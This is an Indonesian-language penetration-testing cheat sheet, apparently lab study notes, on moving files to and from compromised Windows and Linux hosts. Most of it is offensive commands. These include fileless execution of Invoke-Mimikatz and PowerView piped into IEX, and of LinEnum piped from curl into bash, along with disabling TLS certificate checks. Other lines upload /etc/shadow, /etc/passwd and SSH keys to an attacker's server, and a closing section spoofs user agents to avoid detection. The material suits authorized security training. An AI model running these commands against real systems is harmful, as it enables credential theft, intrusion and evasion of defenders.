# File Transfer

<h2 align="center">Windows</h2>

### Metode 1: copas dari Linux

```
# cek dulu hash-nya di linux
md5sum file

# konversi ke base64
cat file |base64 -w 0;echo

# di windows
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("ENCODED-BASE64"))

# pastikan hash-nya sama seperti di awal
Get-FileHash PATH-FILE -Algorithm md5
```

### Metode 2: download file dari sumber online dengan PowerShell

```
# metode yg bisa digunakan
Method	            Description
OpenRead	    Returns the data from a resource as a Stream.
OpenReadAsync	    Returns the data from a resource without blocking the calling thread.
DownloadData	    Downloads data from a resource and returns a Byte array.
DownloadDataAsync   Downloads data from a resource and returns a Byte array without blocking the calling thread.
DownloadFile	    Downloads data from a resource to a local file.
DownloadFileAsync   Downloads data from a resource to a local file without blocking the calling thread.
DownloadString	    Downloads a String from a resource and returns a String.
DownloadStringAsync Downloads a String from a resource without blocking the calling thread.

# contoh dengan method DownloadFile
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

# dengan method DownloadString (fileless: langsung eksekusi tanpa simpan)
IEX (New-Object Net.WebClient).DownloadString('https://<url>/Invoke-Mimikatz.ps1')

# IEX bisa juga untuk pipeline
(New-Object Net.WebClient).DownloadString('URL-KE-FILE-PS1') | IEX

# menggunakan Invoke-WebRequest
Invoke-WebRequest https://<url>/PowerView.ps1 -OutFile PowerView.ps1

# mengatasi error jika konfigurasi internet explorer tidak di selesaikan
# bypass dengan -UseBasicParsing
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

# mengatasi error terkait dengan sertifikat SSL/TLS not trusted
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### Metode 3: SMB download

```
# server SMB di komputer attacker
sudo impacket-smbserver share -smb2support /tmp/smbshare

# dari komp target
copy \\<ip>\share\nc.exe

# versi windows baru memblokir akses yang tidak terautentikasi
# server SMB di komputer attacker
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

# dari komp target
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

### Metode 4: FTP download

```
# install server ftp di komp attacker
sudo pip3 install pyftpdlib

# jalankan di port 21 (user anonymous secara default aktif)
sudo python3 -m pyftpdlib --port 21

# download dari ftp dg powershell
(New-Object Net.WebClient).DownloadFile('ftp://<ip>/file.txt', 'C:\Users\Public\ftp-file.txt')

# membuat ftp interaktif di komp target
C:\batagor> echo open <ip> > ftpcommand.txt
C:\batagor> echo USER anonymous >> ftpcommand.txt
C:\batagor> echo binary >> ftpcommand.txt
C:\batagor> echo GET file.txt >> ftpcommand.txt
C:\batagor> echo bye >> ftpcommand.txt
C:\batagor> ftp -v -n -s:ftpcommand.txt
ftp> open <ip>
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\batagor>more file.txt
Ini isi file contoh
```

### Metode 5: Upload dg encode Base64 di PowerShell

```
# di komp target
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

# salin hash dan paste di komp attacker (linux)
echo ENCODED_BASE64 > base64 -d > hosts

# pastikan file sama, verifikasi dg hash
```

### Metode 6: PowerShell Web Uploads

```
# di komp attacker
pip3 install uploadserver
python3 -m uploadserver

# di komp target (windows)
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://<ip>:<port>/upload -File C:\Windows\System32\drivers\etc\hosts

## upload dengan format Base64
# di komp attacker
nc -lvnp 8000

# di komp target
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://<ip>:8000/ -Method POST -Body $b64
```

### Metode 7: SMB uploads

```
# di komp attacker
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

# tes koneksi dari komp target
dir \\192.168.49.128\DavWWWRoot

# tes upload file dari komp target
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

### Metode 7: FTP uploads

```
# di komp attacker
sudo python3 -m pyftpdlib --port 21 --write

# di komp target (windows)
(New-Object Net.WebClient).UploadFile('ftp://<ip>/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

<h2 align="center">Linux</h2>

### Metode 1: copas encode

```
# di komp attacker
cat id_rsa |base64 -w 0;echo

# di komp target
echo -n encoded_id_rsa | base64 -d > id_rsa

# verifikasi file dg hash
```

### Metode 2: donlot dari sumber online

```
# dengan wget
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh

# dengan curl
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

### Metode 3: Fileless di linux

```
# dengan curl
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

# dengan wget
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

```

### Metode 4: donlot dg bash (/dev/tcp)

```
# koneksi dh web server komp target
exec 3<>/dev/tcp/10.10.10.32/80

# ambil file
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

# tampilkan respon
cat <&3
```

### Metode 5: SSH donlot

```
# di kmp attacker
sudo systemctl enable ssh
sudo systemctl start ssh

# cek listening port ssh
netstat -lnpt

# donlot dari target dg scp
scp plaintext@<ip>:/root/myroot.txt .
```

### Metode 6: web upload

```
# di komp attacker
sudo python3 -m pip install --user uploadserver

# buat selfsigned certificate (masih di komp attacker)
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# jalankan web server
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

# upload dari komp target
curl -X POST https://<ip>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

### Metode 7: alternatif metode transfer file web

```
## membuat server web
# dengan python3
python3 -m http.server

# dg python2.7
python2.7 -m SimpleHTTPServer

# dg PHP
php -S 0.0.0.0:8000

# dg ruby
ruby -run -ehttpd . -p8000

# download file dg curl/wget
```

### Metode 8: SCP upload

```
scp /path-file-yg-diupload username@10.129.86.90:/home/batagor/
```

<h2 align="center">Transfer file dengan kode</h2>

```
# menggunakan python
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

# menggunakan PHP
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash

# menggunakan ruby
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'

# menggunakan perl
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'

# skrip jawa
# buat file wget.js, isinya:
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));

# donlot dengan skrip tadi dari windows
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1

# menggunakan vbscript
# buat file wget.vbs, isinya:
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with

# donlot dengan skrip tadi dari windows
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1

# upload file dg python. jalankan server upload di target
python3 -m uploadserver 

# satu baris kode piton untuk upload
python3 -c 'import requests;requests.post("http://<ip>:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

<h2 align="center">Metode lain</h2>

```
# menggunakan Netcat (nc) dan Ncat
# jalan di komp target
nc -l -p 8000 > batagor.exe
ncat -l -p 8000 --recv-only > batagor.exe

# jalan di komp attacker (-q 0 artinya tutup koneksi setelah selesai)
nc -q 0 <ip> 8000 < batagor.exe
ncat --send-only <ip> 8000 < batagor.exe

## kirim file sebagai input dg netcat dan ncat
# di komp attacker
sudo nc -l -p 443 -q 0 < batagor.exe
sudo ncat -l -p 443 --send-only < batagor.exe

# di target
nc <ip> 443 > batagor.exe
ncat <ip> 443 --recv-only > batagor.exe
```

<h2 align="center">Menghindari Deteksi</h2>

```
## GANTI USER AGENT
# list user agent yg ada di windows
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

# dari list yg ada, pake salah 1
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://<ip>/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```
